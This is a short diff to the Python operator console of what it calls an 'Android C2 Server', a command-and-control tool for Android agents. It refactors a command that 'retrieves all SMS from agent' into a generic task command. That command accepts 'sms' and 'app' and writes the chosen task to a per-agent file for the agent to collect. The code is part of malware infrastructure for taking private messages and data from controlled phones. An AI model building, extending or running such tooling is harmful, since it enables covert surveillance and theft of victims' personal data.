@@ -3,6 +3,8 @@ import shutil
 import os
 import main
 
+commands = ["sms", "app"]
+
 class Terminal(Cmd):
     intro = "Android C2 Server\nType help or ? to list commands\n"
     prompt = '(main) > '
@@ -60,13 +62,13 @@ class Agent_Terminal(Cmd):
         print(f"Agent task: {main.agent_command.get(main.interacted_agent, '')}")
 
     # Agent commands here
-    def do_sms(self, args):
-        "Retrieves all SMS from agent"
-        self.addTask("sms")
-
-    def addTask(self, task):
-        with open(f"task/{main.interacted_agent}", "w") as f:
-            f.write(task) 
+    def do_do(self, args):
+        if args in commands:
+            with open(f"task/{main.interacted_agent}", "w") as f:
+                f.write(args)
+        else:
+            print("[-] Invalid command")
+        
 
     def do_exit(self, arg):
         "Exits the prompt"
